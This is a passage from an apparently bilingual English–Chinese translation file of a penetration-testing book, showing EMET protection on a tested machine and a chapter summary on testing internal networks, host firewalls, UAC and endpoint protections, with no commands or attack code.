  prefs: []
  type: TYPE_NORMAL
  zh: 这个命令将显示已添加并当前受到EMET工具保护的应用程序。以下是一个示例：
- en: '![Enhanced Mitigation Experience Toolkit](img/477-1_10_36.jpg)'
  id: totrans-164
  prefs: []
  type: TYPE_IMG
  zh: '![增强缓解体验工具](img/477-1_10_36.jpg)'
- en: As the previous screenshot shows, this machine is using EMET on Adobe Acrobat,
    Internet Explorer, and Skype. This is one of the challenges if you encounter EMET
    in your testing, your success will depend on how the administrator has configured
    it.
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，这台机器正在使用EMET工具保护Adobe Acrobat、Internet Explorer和Skype。如果您在测试中遇到EMET，您的成功将取决于管理员如何配置它。
- en: Summary
  id: totrans-166
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we discussed the process of testing a flat and internal network.
    We discovered that this means we do not have filters or layers that we have to
    traverse to attack the target. While this is a good thing, we also discussed that
    these machines would have a number of protection in place. We also reviewed the
    role a Vulnerability Scanner plays with respect to internal testing.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们讨论了测试平面和内部网络的过程。我们发现这意味着我们不必穿过过滤器或层来攻击目标。虽然这是一件好事，但我们也讨论了这些机器将有一些保护措施。我们还回顾了漏洞扫描器在内部测试中的作用。
- en: Following the introduction to the different host-based protection, we looked
    at them in more detail and in some cases, attempted a number of different techniques
    to bypass the different protection on the host that we might encounter. Specifically,
    we looked at the host firewall and the UAC settings and their impact on the testing
    results.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 在介绍了不同的基于主机的保护措施后，我们更详细地研究了它们，并在某些情况下尝试了许多不同的技术来绕过我们可能遇到的主机上的不同保护。具体来说，我们查看了主机防火墙和UAC设置以及它们对测试结果的影响。
- en: When we had looked at the host firewall and UAC, we moved on and briefly looked
    at the additional endpoint protections that could challenge our testing.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们查看了主机防火墙和UAC后，我们继续简要地查看了可能挑战我们测试的其他端点保护。
- en: Finally, we closed the chapter by looking at the challenges that the EMET tool
    might present for our testing.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们通过查看EMET工具可能对我们的测试提出的挑战来结束了本章。
- en: This concludes the chapter. You have now reviewed some of the challenges that
    you might be facing with when you are testing the flat and internal networks.
    We will next look at the testing methods when evaluating servers and services
    for weaknesses.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 本章到此结束。您现在已经审查了在测试平面和内部网络时可能面临的一些挑战。接下来，我们将看看在评估服务器和服务的弱点时的测试方法。
